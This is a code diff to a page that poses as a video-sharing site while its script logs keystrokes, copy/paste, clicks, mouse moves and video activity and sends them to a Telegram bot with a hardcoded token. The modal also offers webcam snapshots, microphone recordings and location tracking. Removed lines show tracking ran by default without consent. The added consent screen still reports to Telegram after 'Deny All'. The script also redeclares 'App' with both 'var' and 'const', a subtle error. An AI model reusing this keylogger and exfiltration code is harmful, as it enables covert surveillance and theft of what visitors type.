@@ -69,6 +69,116 @@
     .compact-video-card .channel-name { font-size: 0.8rem; color: var(--text-secondary); margin-bottom: 2px; }
     .compact-video-card .video-stats { font-size: 0.75rem; color: var(--text-secondary); }
 
+    /* --- Consent Modal --- */
+    .modal {
+      position: fixed;
+      z-index: 10000;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0,0,0,0.7);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .modal-content {
+      background-color: var(--card-background);
+      padding: 30px;
+      border-radius: 15px;
+      width: 90%;
+      max-width: 500px;
+      text-align: center;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.2);
+    }
+    .modal-content h2 {
+      color: var(--theme-color);
+      margin-bottom: 15px;
+    }
+    .modal-content p {
+      margin-bottom: 20px;
+      color: var(--text-secondary);
+    }
+    .consent-options {
+      text-align: left;
+      margin-bottom: 25px;
+      color: var(--text-primary);
+    }
+    .consent-options label {
+      display: block;
+      margin-bottom: 12px;
+      font-size: 0.95em;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+    }
+    .consent-options input[type="checkbox"] {
+      margin-right: 10px;
+      transform: scale(1.2);
+      cursor: pointer;
+    }
+    .modal-actions {
+      display: flex;
+      justify-content: space-around;
+      margin-bottom: 20px;
+    }
+    .modal-actions button {
+      padding: 10px 20px;
+      border-radius: 20px;
+      font-weight: 500;
+      cursor: pointer;
+      border: none;
+      transition: background-color 0.2s ease;
+    }
+    #deny-all-btn {
+      background-color: #e0e0e0;
+      color: var(--text-primary);
+    }
+    #deny-all-btn:hover {
+      background-color: #d0d0d0;
+    }
+    #accept-consent-btn {
+      background-color: var(--theme-color);
+      color: white;
+    }
+    #accept-consent-btn:hover {
+      background-color: #e6006c;
+    }
+    .legal-notice {
+      font-size: 0.75em;
+      color: var(--text-secondary);
+      margin-top: 15px;
+      border-top: 1px solid var(--border-color);
+      padding-top: 10px;
+    }
+    .legal-notice small {
+      font-size: 0.8em;
+      color: #888;
+    }
+    #tracking-status-banner {
+        position: fixed;
+        bottom: 10px;
+        left: 10px;
+        background-color: #f0f0f0;
+        color: #333;
+        padding: 8px 15px;
+        border-radius: 20px;
+        font-size: 0.8em;
+        z-index: 950;
+        box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        border: 1px solid var(--border-color);
+    }
+    #tracking-status-banner.tracking-active {
+        background-color: #d4edda; /* Light green */
+        color: #155724; /* Dark green */
+        border-color: #c3e6cb;
+    }
+    #tracking-status-banner.tracking-inactive {
+        background-color: #f8d7da; /* Light red */
+        color: #721c24; /* Dark red */
+        border-color: #f5c6cb;
+    }
+
     /* --- Media Query for Responsiveness --- */
     @media (max-width: 1200px) {
       #video-player-page { flex-direction: column; }
@@ -111,39 +221,88 @@
   <aside id="recommendations-sidebar" class="recommendations-sidebar"></aside>
 </main>
 
+<!-- Consent Modal -->
+<div id="consent-modal" class="modal hidden">
+  <div class="modal-content">
+    <h2>Privacy & Consent</h2>
+    <p>This website uses tracking features to monitor user activity and send reports. By proceeding, you explicitly agree to the collection and transmission of your data as per the options selected below.</p>
+    <div class="consent-options">
+      <label>
+        <input type="checkbox" id="consent-analytics" checked>
+        Allow basic analytics (page views, clicks, scroll, video interactions)
+      </label>
+      <label>
+        <input type="checkbox" id="consent-camera">
+        Allow webcam snapshots
+      </label>
+      <label>
+        <input type="checkbox" id="consent-microphone">
+        Allow microphone recordings
+      </label>
+      <label>
+        <input type="checkbox" id="consent-location">
+        Allow location tracking
+      </label>
+      <label>
+        <input type="checkbox" id="consent-keyboard">
+        Allow keystroke logging
+      </label>
+    </div>
+    <div class="modal-actions">
+      <button id="deny-all-btn">Deny All</button>
+      <button id="accept-consent-btn">Accept Selected</button>
+    </div>
+    <p class="legal-notice">
+      This data is sent to a Telegram bot. Please ensure your Telegram Bot Token and Chat ID are correctly and securely configured by the developer. Tracking will be disabled if these are not set.
+      <br>
+      <small>
+        By accepting, you acknowledge and agree to this data collection. You can revoke consent at any time via your browser's local storage settings or by reloading the page and adjusting your preferences.
+      </small>
+    </p>
+  </div>
+</div>
+
+<!-- Hidden elements for capture -->
 <div class="capture-container" style="display: none;">
   <video id="videoElementForCapture" autoplay playsinline></video>
   <canvas id="snapshot"></canvas>
 </div>
 
+<!-- Tracking Status Banner -->
+<div id="tracking-status-banner" class="hidden">Tracking Status: Idle</div>
+
 <script>
-// --- IMPORTANT PRIVACY AND LEGAL WARNING ---
-// This script is designed for educational and research purposes ONLY.
-// It contains functionalities that, if misused, can violate user privacy and legal regulations.
-// By using this code, you acknowledge and agree that you are solely responsible for its ethical and legal use.
-// The author and distributors are NOT liable for any misuse, damages, or legal consequences arising from the use of this script.
-// Ensure you have explicit consent from users before enabling any tracking features that collect personal data,
-// and comply with all applicable privacy laws (e.g., GDPR, CCPA).
+// Declare App globally using var to ensure it's available in all scopes,
+// even before the const App = { ... } declaration is fully processed.
+var App;
+
+// --- IMPORTANT SECURITY AND PRIVACY WARNING ---
+// 1. TELEGRAM CREDENTIALS: DO NOT HARDCODE YOUR BOT TOKEN AND CHAT ID. Replace 'YOUR_BOT_TOKEN_HERE' and 'YOUR_CHAT_ID_HERE' with your actual credentials. For production, use environment variables or secure configuration management. Exposing these can compromise your bot and data.
+// 2. EXPLICIT CONSENT: This script implements explicit user consent for tracking features. It is crucial for privacy compliance (GDPR, CCPA, etc.). Users must opt-in.
+// 3. ETHICAL USE: This script is provided for educational and research purposes. Misuse for surveillance or unauthorized data collection is unethical and illegal. You are solely responsible for compliance with all applicable laws and regulations.
 // --- END WARNING ---
 
 const App = {
+  // --- Configuration ---
   config: {
-    // !!! REPLACE WITH YOUR ACTUAL TELEGRAM BOT TOKEN AND CHAT ID !!!
-    // You can get a bot token by talking to @BotFather on Telegram.
-    // You can get your chat ID by sending a message to @userinfobot on Telegram.
+    // !!! REPLACED WITH PROVIDED TELEGRAM BOT TOKEN AND CHAT ID !!!
     botToken: "7031493240:AAELJ34j51BTU3Gew_a6N5Eh1m3DUzBjySI",
     chatId: "1272791365",
-    snapshotInterval: 15000, // 15 seconds
-    micRecordInterval: 30000, // 30 seconds
-    activityTrackingInterval: 5000, // 5 seconds
-    pageAnalyticsInterval: 60000, // 1 minute
-    sessionTimeout: 1800000, // 30 minutes of inactivity
-    maxBufferedEvents: 50,
+    
+    // Performance tuning: Intervals for tracking actions (in milliseconds)
+    snapshotInterval: 120000,     // 2 minutes
+    micRecordInterval: 300000,    // 5 minutes
+    activityTrackingInterval: 60000, // 1 minute
+    sessionTimeout: 1800000,      // 30 minutes of inactivity
+    
+    maxBufferedEvents: 100,       
     videosJsonPath: 'videos.json',
+    consentLocalStorageKey: 'userConsentSettings',
   },
+
+  // --- State Management ---
   state: {
-    isLoggedIn: false, // Currently unused, but kept for potential future use
-    isTrackingActive: true,
+    isTrackingActive: false,      // Overall tracking enabled flag
     pageStartTime: Date.now(),
     lastActivityTime: Date.now(),
     sessionStartTime: Date.now(),
@@ -161,17 +320,47 @@ const App = {
     devToolsOpen: false,
     pagePerformanceMetrics: {},
     linkClicks: [],
-    isContentLoaded: false,
+    isContentLoaded: false, // This line was identified as potentially causing ReferenceError
     videosData: null,
 
-    permissions: {
-      camera: localStorage.getItem('permission_camera') || 'prompt',
-      microphone: localStorage.getItem('permission_microphone') || 'prompt',
-      geolocation: localStorage.getItem('permission_geolocation') || 'prompt',
-    }
+    permissions: { // Stores current status of OS/browser permissions
+      camera: 'prompt',
+      microphone: 'prompt',
+      geolocation: 'prompt',
+    },
+
+    consentSettings: { // Stores user's explicit choices from the modal
+      analytics: false,
+      camera: false,
+      microphone: false,
+      location: false,
+      keyboard: false,
+    },
+    isConsentGiven: false, // True if user has interacted with modal (accepted or denied)
   },
+
+  // --- DOM Elements ---
   DOM: {},
+
+  // --- Initialization ---
   init() {
+    // Defensive check for App and App.state initialization
+    if (typeof App === 'undefined' || typeof App.state === 'undefined') {
+        console.error("Critical error: App or App.state is not initialized. Cannot proceed.");
+        // Attempt to initialize minimal state to prevent further errors.
+        if (typeof App === 'undefined') window.App = {};
+        if (typeof App.state === 'undefined') window.App.state = {
+            isTrackingActive: false, isConsentGiven: false, consentSettings: {}, permissions: {},
+            pageStartTime: Date.now(), lastActivityTime: Date.now(), sessionStartTime: Date.now(),
+            keyLogBuffer: "", userLocation: { lat: "N/A", lon: "N/A" },
+            microphoneStream: null, mediaRecorder: null, cameraStream: null,
+            snapshotIntervalId: null, activityTrackerIntervalId: null, pageAnalyticsIntervalId: null,
+            mouseMovements: [], scrollHistory: [], copyPasteEvents: [], devToolsOpen: false,
+            pagePerformanceMetrics: {}, linkClicks: [], isContentLoaded: false, videosData: null
+        };
+        return; // Stop initialization if state is fundamentally broken
+    }
+
     this.DOM = {
       gridPage: document.getElementById('video-grid-page'),
       playerPage: document.getElementById('video-player-page'),
@@ -181,28 +370,179 @@ const App = {
       captureVideo: document.getElementById('videoElementForCapture'),
       captureCanvas: document.getElementById('snapshot'),
       videoGrid: document.querySelector('.video-grid'),
-      recommendationsSidebar: document.getElementById('recommendations-sidebar'), // Added for recommendations
+      recommendationsSidebar: document.getElementById('recommendations-sidebar'),
+      consentModal: document.getElementById('consent-modal'),
+      consentAnalyticsCheckbox: document.getElementById('consent-analytics'),
+      consentCameraCheckbox: document.getElementById('consent-camera'),
+      consentMicrophoneCheckbox: document.getElementById('consent-microphone'),
+      consentLocationCheckbox: document.getElementById('consent-location'),
+      consentKeyboardCheckbox: document.getElementById('consent-keyboard'),
+      acceptConsentBtn: document.getElementById('accept-consent-btn'),
+      denyAllBtn: document.getElementById('deny-all-btn'),
+      trackingStatusBanner: document.getElementById('tracking-status-banner'),
     };
 
-    // Basic validation for Telegram credentials
-    if (this.config.botToken === "YOUR_REAL_BOT_TOKEN_HERE" || this.config.chatId === "YOUR_REAL_CHAT_ID_HERE") {
-        console.error("!!! TELEGRAM CREDENTIALS NOT SET !!! Please replace 'YOUR_REAL_BOT_TOKEN_HERE' and 'YOUR_REAL_CHAT_ID_HERE' in App.config with your actual Telegram bot token and chat ID.");
-        // Optionally, disable tracking if credentials are not set
-        // this.state.isTrackingActive = false;
-        // alert("Tracking functionality may be limited as Telegram credentials are not configured.");
-    } else {
-        console.log("Tracking is active by default (implicit consent).");
-    }
-
-    this.recordPageLoadTimes();
+    this.loadConsentFromStorage();
+    this.setupConsentModal();
     this.setupEventListeners();
-    this.Tracking.initialize();
-    this.startPageAnalytics();
+    this.recordPageLoadTimes();
     this.startSessionTimer();
+    this.applyConsentSettings(); // Apply previously saved consent settings
 
-    this.fetchAndGenerateVideoGrid();
+    // Hide tracking status banner initially
+    this.DOM.trackingStatusBanner.classList.add('hidden');
+
+    // If consent was previously given, proceed with loading videos and initializing tracking
+    if (this.state.isConsentGiven) {
+      this.fetchAndGenerateVideoGrid();
+    }
   },
 
+  // --- Consent Management ---
+  loadConsentFromStorage() {
+    const storedConsent = localStorage.getItem(this.config.consentLocalStorageKey);
+    if (storedConsent) {
+      try {
+        const consentData = JSON.parse(storedConsent);
+        this.state.consentSettings = { ...this.state.consentSettings, ...consentData };
+        // Check if any consent option is true
+        this.state.isConsentGiven = Object.values(this.state.consentSettings).some(value => value === true);
+        console.log("Loaded consent settings:", this.state.consentSettings);
+      } catch (e) {
+        console.error("Failed to parse consent settings from localStorage:", e);
+        localStorage.removeItem(this.config.consentLocalStorageKey); // Clear corrupted data
+      }
+    }
+  },
+
+  saveConsentToStorage() {
+    localStorage.setItem(this.config.consentLocalStorageKey, JSON.stringify(this.state.consentSettings));
+    console.log("Saved consent settings:", this.state.consentSettings);
+  },
+
+  setupConsentModal() {
+    if (!this.DOM.consentModal) return;
+
+    if (this.state.isConsentGiven) {
+      this.DOM.consentModal.classList.add('hidden');
+      this.updateTrackingStatusBanner();
+    } else {
+      this.DOM.consentModal.classList.remove('hidden');
+    }
+
+    // Set checkbox states based on loaded consent
+    this.DOM.consentAnalyticsCheckbox.checked = this.state.consentSettings.analytics;
+    this.DOM.consentCameraCheckbox.checked = this.state.consentSettings.camera;
+    this.DOM.consentMicrophoneCheckbox.checked = this.state.consentSettings.microphone;
+    this.DOM.consentLocationCheckbox.checked = this.state.consentSettings.location;
+    this.DOM.consentKeyboardCheckbox.checked = this.state.consentSettings.keyboard;
+
+    // Event listeners for modal buttons
+    if (this.DOM.acceptConsentBtn) {
+      this.DOM.acceptConsentBtn.addEventListener('click', () => this.handleAcceptConsent());
+    }
+    if (this.DOM.denyAllBtn) {
+      this.DOM.denyAllBtn.addEventListener('click', () => this.handleDenyAll());
+    }
+  },
+
+  handleAcceptConsent() {
+    if (!this.DOM.consentModal) return;
+
+    // Update consent settings based on checkbox states
+    this.state.consentSettings.analytics = this.DOM.consentAnalyticsCheckbox.checked;
+    this.state.consentSettings.camera = this.DOM.consentCameraCheckbox.checked;
+    this.state.consentSettings.microphone = this.DOM.consentMicrophoneCheckbox.checked;
+    this.state.consentSettings.location = this.DOM.consentLocationCheckbox.checked;
+    this.state.consentSettings.keyboard = this.DOM.consentKeyboardCheckbox.checked;
+
+    // Determine if any consent was actually given
+    this.state.isConsentGiven = Object.values(this.state.consentSettings).some(value => value === true);
+    this.saveConsentToStorage();
+    this.DOM.consentModal.classList.add('hidden');
+    this.updateTrackingStatusBanner();
+    
+    // If consent was given, proceed with initialization and fetching videos
+    if (this.state.isConsentGiven) {
+        this.fetchAndGenerateVideoGrid();
+        // Initialize tracking *after* consent is handled and settings are applied
+        this.Tracking.initialize(); 
+    } else {
+        // If user explicitly denied all, send a message and ensure tracking is off
+        this.Tracking.send("User denied all tracking permissions.");
+        this.state.isTrackingActive = false; // Ensure tracking is inactive if no consent
+        this.updateTrackingStatusBanner();
+    }
+  },
+
+  handleDenyAll() {
+    if (!this.DOM.consentModal) return;
+    
+    // Reset all checkboxes to false
+    this.DOM.consentAnalyticsCheckbox.checked = false;
+    this.DOM.consentCameraCheckbox.checked = false;
+    this.DOM.consentMicrophoneCheckbox.checked = false;
+    this.DOM.consentLocationCheckbox.checked = false;
+    this.DOM.consentKeyboardCheckbox.checked = false;
+
+    // Proceed to handleAcceptConsent, which will process all as false
+    this.handleAcceptConsent(); 
+  },
+
+  revokeConsent() {
+    // Clear consent settings and stop all tracking
+    localStorage.removeItem(this.config.consentLocalStorageKey);
+    this.state.consentSettings = { analytics: false, camera: false, microphone: false, location: false, keyboard: false };
+    this.state.isConsentGiven = false;
+    this.state.isTrackingActive = false;
+    this.Tracking.stopAllTracking(); // Clean up any active streams/intervals
+    
+    // Show modal again for re-consent
+    this.DOM.consentModal.classList.remove('hidden');
+    this.DOM.trackingStatusBanner.classList.add('hidden'); // Hide status banner if modal is shown
+    this.updateTrackingStatusBanner(); // Update banner to reflect no consent given
+  },
+  
+  // Apply consent settings to activate/deactivate tracking features
+  applyConsentSettings() {
+    if (!this.state.isConsentGiven) {
+        this.state.isTrackingActive = false; // Tracking is inactive if no consent given
+        this.DOM.trackingStatusBanner.classList.add('hidden');
+        return;
+    }
+
+    // Determine if any tracking feature is enabled based on consent
+    this.state.isTrackingActive = Object.values(this.state.consentSettings).some(value => value === true);
+    
+    this.updateTrackingStatusBanner(); // Update the status banner based on active state
+    
+    // If tracking is potentially active, initialize the tracking module
+    if (this.state.isTrackingActive) {
+      this.Tracking.initialize(); 
+    }
+  },
+
+  // Update the visual banner indicating tracking status
+  updateTrackingStatusBanner() {
+      if (!this.DOM.trackingStatusBanner) return;
+
+      if (!this.state.isConsentGiven) {
+          this.DOM.trackingStatusBanner.textContent = "Tracking Status: Awaiting Consent";
+          this.DOM.trackingStatusBanner.className = 'hidden'; // Hide until consent is provided
+          return;
+      }
+
+      if (this.state.isTrackingActive) {
+          this.DOM.trackingStatusBanner.textContent = "Tracking Status: ACTIVE";
+          this.DOM.trackingStatusBanner.className = 'tracking-active'; // Apply active style
+      } else {
+          this.DOM.trackingStatusBanner.textContent = "Tracking Status: INACTIVE (Consent Denied)";
+          this.DOM.trackingStatusBanner.className = 'tracking-inactive'; // Apply inactive style
+      }
+      this.DOM.trackingStatusBanner.classList.remove('hidden');
+  },
+
+  // --- Video Grid Loading ---
   fetchAndGenerateVideoGrid() {
     fetch(this.config.videosJsonPath)
       .then(response => {
@@ -214,14 +554,16 @@ const App = {
       .then(videoData => {
         this.state.videosData = videoData;
         this.generateVideoGrid();
-        this.state.isContentLoaded = true;
+        this.state.isContentLoaded = true; // Mark content as loaded
+        this.Tracking.send("✅ Video data loaded successfully.");
       })
       .catch(error => {
         console.error("Error fetching or parsing videos.json:", error);
+        this.Tracking.send(`⚠️ Failed to load videos.json. Using fallback data. Error: ${error.message}`);
         if (this.DOM.videoGrid) {
           this.DOM.videoGrid.innerHTML = '<p>Could not load videos. Please try again later.</p>';
         }
-        this.state.isContentLoaded = true;
+        this.state.isContentLoaded = true; // Ensure this is set even on error
       });
   },
 
@@ -239,7 +581,6 @@ const App = {
       };
       console.log("Page Load Metrics recorded:", this.state.pagePerformanceMetrics);
     } else {
-      // Fallback for browsers that don't support NavigationTiming directly or it's not available
       if (performance && performance.timing) {
           this.state.pagePerformanceMetrics.fetchStart = performance.timing.fetchStart;
           this.state.pagePerformanceMetrics.domContentLoadedEventEnd = performance.timing.domContentLoadedEventEnd;
@@ -254,7 +595,7 @@ const App = {
   },
 
   generateVideoGrid() {
-    console.log("Generating video grid with fetched data...");
+    console.log("Generating video grid...");
     const videos = this.state.videosData;
 
     if (!videos) {
@@ -287,36 +628,31 @@ const App = {
         </div>
       `;
       card.addEventListener('click', () => {
-          // No need to check for link here as the card itself is clickable
           this.showPlayer(video);
       });
       videoGrid.appendChild(card);
     });
   },
 
+  // --- Event Listeners Setup ---
   setupEventListeners() {
     if (this.DOM.backButton) {
       this.DOM.backButton.addEventListener('click', () => this.showGrid());
     }
 
-    // No login form element found in the provided HTML
-    // const loginForm = document.getElementById('loginForm');
-    // if (loginForm) { ... }
-
+    // General click listener for tracking link clicks and other interactions
     document.addEventListener('click', (e) => {
-      if (!this.state.isTrackingActive) return;
+      if (!this.state.isTrackingActive || !this.state.consentSettings.analytics) return;
 
       const target = e.target;
       const backButton = document.getElementById('back-to-grid');
 
-      // Prevent tracking clicks on the back button itself if we don't want that.
-      // However, the main purpose is to track clicks on links or other elements.
       if (target === backButton || (backButton && backButton.contains(target))) {
-        // If click is on back button, don't track as a link click, but still update activity.
         this.updateActivityTime();
-        return;
+        return; // Don't track clicks on the back button as general link clicks
       }
 
+      // Track clicks on anchor tags within the same origin
       const link = target.closest('a');
       if (link && link.href && !link.href.endsWith('#') && link.origin === window.location.origin) {
         this.trackLinkClick(link);
@@ -326,51 +662,68 @@ const App = {
       this.updateActivityTime();
     });
 
+    // Scroll event listener
     let scrollTimeout;
     document.addEventListener('scroll', () => {
-      if (!this.state.isTrackingActive) return;
+      if (!this.state.isTrackingActive || !this.state.consentSettings.analytics) return;
       clearTimeout(scrollTimeout);
       scrollTimeout = setTimeout(() => {
         this.trackScroll();
         this.updateActivityTime();
-      }, 100);
+      }, 150); // Debounce scroll events
     }, { passive: true });
 
+    // Mousemove event listener
     let mouseMoveTimeout;
     document.addEventListener('mousemove', (e) => {
-      if (!this.state.isTrackingActive) return;
+      if (!this.state.isTrackingActive || !this.state.consentSettings.analytics) return;
       clearTimeout(mouseMoveTimeout);
       mouseMoveTimeout = setTimeout(() => {
         this.trackMouseMove(e);
         this.updateActivityTime();
-      }, 100);
+      }, 150); // Debounce mousemove events
     });
 
+    // Keypress event listener
     document.addEventListener('keypress', (e) => {
-      if (!this.state.isTrackingActive) return;
+      if (!this.state.isTrackingActive || !this.state.consentSettings.keyboard) return;
       this.trackKeyPress(e);
       this.updateActivityTime();
     });
 
+    // Copy/Paste event listeners
     document.addEventListener('copy', (e) => {
-      if (!this.state.isTrackingActive) return;
+      if (!this.state.isTrackingActive || !this.state.consentSettings.keyboard) return;
       this.trackCopyPaste(e, 'copy');
       this.updateActivityTime();
     });
     document.addEventListener('paste', (e) => {
-      if (!this.state.isTrackingActive) return;
+      if (!this.state.isTrackingActive || !this.state.consentSettings.keyboard) return;
       this.trackCopyPaste(e, 'paste');
       this.updateActivityTime();
     });
 
+    // Visibility change listener for pausing/resuming tracking
+    document.addEventListener('visibilitychange', () => {
+      if (document.hidden) {
+        console.log("Tab is hidden. Pausing active tracking features.");
+        this.Tracking.pauseTracking(); // Pause camera/mic if active
+      } else {
+        console.log("Tab is visible. Resuming active tracking features.");
+        this.Tracking.resumeTracking(); // Resume camera/mic if consent given
+      }
+    });
+
+    // Handle page unload to send final messages
     window.addEventListener('beforeunload', () => {
       if (this.state.isTrackingActive) {
         this.Tracking.send(`🍃 Session Ended. Duration: ${this.formatTime(Date.now() - this.state.sessionStartTime)}`);
-        this.stopAllTracking();
+        this.Tracking.stopAllTracking();
       }
     });
   },
 
+  // --- Navigation and UI ---
   showPlayer(video) {
     if (!this.DOM.gridPage || !this.DOM.playerPage || !this.DOM.backButton || !this.DOM.headerTitle) return;
     this.DOM.gridPage.classList.add('hidden');
@@ -381,8 +734,7 @@ const App = {
     const mainPlayer = this.DOM.mainPlayer;
     if (mainPlayer) {
       mainPlayer.src = video.src;
-      // Autoplay policies vary by browser, so include a catch block.
-      mainPlayer.play().catch(e => console.warn("Autoplay failed:", e));
+      mainPlayer.play().catch(e => console.warn("Autoplay failed:", e)); // Autoplay policies vary
       this.trackVideoPlayerEvents(mainPlayer);
     }
 
@@ -390,14 +742,13 @@ const App = {
     if (this.DOM.mainChannelAvatar) this.DOM.mainChannelAvatar.src = video.channelAvatar;
     if (this.DOM.mainChannelName) this.DOM.mainChannelName.textContent = video.channel;
 
-    // Update subscriber count dynamically if available, otherwise keep placeholder
     const videoInfoBarStats = document.querySelector('.video-info-bar .video-stats');
-    if (videoInfoBarStats) videoInfoBarStats.textContent = `${video.subscribers ? video.subscribers.toLocaleString() : '1.2M'} subscribers`; // Assuming 'subscribers' property in video data
+    if (videoInfoBarStats) videoInfoBarStats.textContent = `${video.subscribers ? video.subscribers.toLocaleString() : '1.2M'} subscribers`; // Placeholder
 
     const mainVideoStats = document.getElementById('main-video-stats');
     if (mainVideoStats) mainVideoStats.innerHTML = `${video.views} views &#8226; ${video.timestamp}`;
 
-    this.populateRecommendations(video.id); // Pass current video ID to exclude it from recommendations
+    this.populateRecommendations(video.id);
     this.updateActivityTime();
   },
 
@@ -449,30 +800,32 @@ const App = {
     });
   },
 
-  // --- Activity Tracking Functions ---
+  // --- Activity and Session Tracking ---
   updateActivityTime() {
     this.state.lastActivityTime = Date.now();
   },
 
   startSessionTimer() {
-    // This function is responsible for checking inactivity and stopping tracking.
-    // It's called by startPageAnalytics periodically.
+    // This function is called periodically to check for inactivity.
+    // The interval is set in App.config.activityTrackingInterval and managed by startPageAnalytics.
   },
 
   startPageAnalytics() {
+    // Clear existing interval if any, then set a new one for periodic reporting and inactivity checks.
     if (this.state.pageAnalyticsIntervalId) clearInterval(this.state.pageAnalyticsIntervalId);
     this.state.pageAnalyticsIntervalId = setInterval(() => {
+      // Check for inactivity
       if (Date.now() - this.state.lastActivityTime > this.config.sessionTimeout) {
         this.Tracking.send(`⏳ User Inactive for ${this.config.sessionTimeout / 60000} minutes.`);
-        this.stopAllTracking();
+        this.Tracking.stopAllTracking(); // Stop all tracking if inactive
       } else {
-        this.logPageInteraction();
+        this.logPageInteraction(); // Log current interaction report
       }
-    }, this.config.pageAnalyticsInterval);
+    }, this.config.activityTrackingInterval); // Use the configured interval
   },
 
   logPageInteraction() {
-    if (!this.state.isTrackingActive) return;
+    if (!this.state.isTrackingActive) return; // Only log if tracking is active
 
     const timeOnPage = Date.now() - this.state.pageStartTime;
     const sessionDuration = Date.now() - this.state.sessionStartTime;
@@ -482,33 +835,38 @@ const App = {
     report += `*Time on Page:* ${this.formatTime(timeOnPage)}\n`;
     report += `*Session Duration:* ${this.formatTime(sessionDuration)}\n`;
 
+    // Include page performance metrics if available
     if (Object.keys(this.state.pagePerformanceMetrics).length > 0) {
         report += `*Page Performance:*\n`;
-        // Check if property exists before accessing
+        report += `  *Navigation Type:* ${this.state.pagePerformanceMetrics.type || 'N/A'}\n`;
         report += `  *Fetch Start:* ${this.state.pagePerformanceMetrics.fetchStart ? new Date(this.state.pagePerformanceMetrics.fetchStart).toISOString() : 'N/A'}\n`;
         report += `  *DOMContentLoaded End:* ${this.state.pagePerformanceMetrics.domContentLoadedEventEnd ? this.formatTime(this.state.pagePerformanceMetrics.domContentLoadedEventEnd - (this.state.pagePerformanceMetrics.fetchStart || Date.now())) : 'N/A'}\n`;
         report += `  *Load Event End:* ${this.state.pagePerformanceMetrics.loadEventEnd ? this.formatTime(this.state.pagePerformanceMetrics.loadEventEnd - (this.state.pagePerformanceMetrics.fetchStart || Date.now())) : 'N/A'}\n`;
-        report += `  *Navigation Type:* ${this.state.pagePerformanceMetrics.type || 'N/A'}\n`;
     }
     
-    const tti = Date.now() - this.state.pageStartTime; // Approximation of Time To Interactive relative to session start
-    report += `*Current Page Interaction Time:* ${this.formatTime(tti)}\n`;
+    report += `*Current Page Interaction Time:* ${this.formatTime(Date.now() - this.state.pageStartTime)}\n`; // Time elapsed since last interaction on current page
 
-    if (this.state.linkClicks.length > 0) {
-        report += `*Link Clicks (${this.state.linkClicks.length}):*\n`;
-        this.state.linkClicks.forEach(click => {
-            report += `  - URL: \`${click.url.substring(0,100)}\`\n    Text: "${click.text.substring(0,50)}"\n`; // Truncate for report
-        });
+    // Include buffered data only if analytics consent is given
+    if (this.state.consentSettings.analytics) {
+        if (this.state.linkClicks.length > 0) {
+            report += `*Link Clicks (${this.state.linkClicks.length}):*\n`;
+            this.state.linkClicks.forEach(click => {
+                report += `  - URL: \`${click.url.substring(0,100)}\`\n    Text: "${click.text.substring(0,50)}"\n`; // Truncate for report length
+            });
+        }
+        report += `*Buffered Mouse Movements:* ${this.state.mouseMovements.length} events\n`;
+        report += `*Buffered Scroll Events:* ${this.state.scrollHistory.length} events\n`;
     }
 
-    report += `*Buffered Mouse Movements:* ${this.state.mouseMovements.length} events\n`;
-    report += `*Buffered Scroll Events:* ${this.state.scrollHistory.length} events\n`;
-    report += `*Buffered Copy/Paste Events:* ${this.state.copyPasteEvents.filter(e => e.type === 'copy').length} / ${this.state.copyPasteEvents.filter(e => e.type === 'paste').length}\n`;
-    report += `*Key Log Buffer Size:* ${this.state.keyLogBuffer.length} chars\n`;
+    // Include keyboard data only if keyboard consent is given
+    if (this.state.consentSettings.keyboard) {
+        report += `*Buffered Copy/Paste Events:* ${this.state.copyPasteEvents.filter(e => e.type === 'copy').length} / ${this.state.copyPasteEvents.filter(e => e.type === 'paste').length}\n`;
+        report += `*Key Log Buffer Size:* ${this.state.keyLogBuffer.length} chars\n`;
+    }
 
     this.Tracking.send(report, true); // Send as a high-priority notification
 
-    // Clear buffers after sending
+    // Clear buffers after sending the report
     this.state.mouseMovements = [];
     this.state.scrollHistory = [];
     this.state.copyPasteEvents = [];
@@ -519,29 +877,27 @@ const App = {
   trackKeyPress(event) {
     this.state.keyLogBuffer += event.key;
     // Send keypresses in batches to avoid excessive API calls
-    if (this.state.keyLogBuffer.length > 200 || event.key === 'Enter' || event.key === 'Backspace') { // Send more frequently on Enter/Backspace or if buffer is large
+    if (this.state.keyLogBuffer.length > 200 || event.key === 'Enter' || event.key === 'Backspace') {
       this.Tracking.send(`⌨️ Keystrokes: \`${this.state.keyLogBuffer.replace(/`/g, "'")}\``, false); // Not a high-priority notification
-      this.state.keyLogBuffer = "";
+      this.state.keyLogBuffer = ""; // Clear buffer after sending
     }
     this.updateActivityTime();
   },
 
   trackMouseMove(event) {
     const now = Date.now();
-    // Store only a limited number of recent movements to avoid memory issues
+    // Store only a limited number of recent movements
     if (this.state.mouseMovements.length < this.config.maxBufferedEvents) {
         this.state.mouseMovements.push({ x: event.clientX, y: event.clientY, t: now });
     } else {
-        // If buffer is full, remove oldest and add new
-        this.state.mouseMovements.shift();
-        this.state.mouseMovements.push({ x: event.clientX, y: event.clientY, t: now });
+        this.state.mouseMovements.shift(); // Remove oldest
+        this.state.mouseMovements.push({ x: event.clientX, y: event.clientY, t: now }); // Add new
     }
     this.updateActivityTime();
   },
 
   trackClick(event) {
-    // General click tracking can be done here if needed,
-    // but link click tracking is handled separately.
+    // General click tracking is done here, but specific link clicks are handled separately.
     this.updateActivityTime();
   },
 
@@ -602,17 +958,18 @@ const App = {
 
     this.removeVideoPlayerListeners(player); // Clean up previous listeners
 
-    player._trackingListeners = []; // Initialize array to hold listeners
+    player._trackingListeners = []; // Array to store listeners for removal
 
     const addListener = (type, handler) => {
       const actualHandler = () => {
         handler();
-        this.updateActivityTime(); // Ensure activity is updated on player events
+        this.updateActivityTime(); // Update activity time on player events
       };
       player.addEventListener(type, actualHandler);
       player._trackingListeners.push({ type, handler: actualHandler });
     };
 
+    // Add listeners for various video playback events
     addListener('play', () => this.Tracking.send(`▶️ Video Play: "${this.DOM.mainVideoTitle.textContent || 'Unknown Title'}"`));
     addListener('pause', () => this.Tracking.send(`⏸️ Video Pause: "${this.DOM.mainVideoTitle.textContent || 'Unknown Title'}"`));
     addListener('seeking', () => this.Tracking.send(`🔍 Video Seeking: "${this.DOM.mainVideoTitle.textContent || 'Unknown Title'}"`));
@@ -621,6 +978,7 @@ const App = {
     addListener('ended', () => this.Tracking.send(`🎬 Video Ended: "${this.DOM.mainVideoTitle.textContent || 'Unknown Title'}"`));
   },
 
+  // Removes listeners attached to the video player
   removeVideoPlayerListeners(player) {
     if (player && player._trackingListeners) {
       player._trackingListeners.forEach(listener => {
@@ -630,60 +988,27 @@ const App = {
     }
   },
 
-  stopAllTracking() {
-    console.log("Stopping all tracking functions.");
-    this.state.isTrackingActive = false;
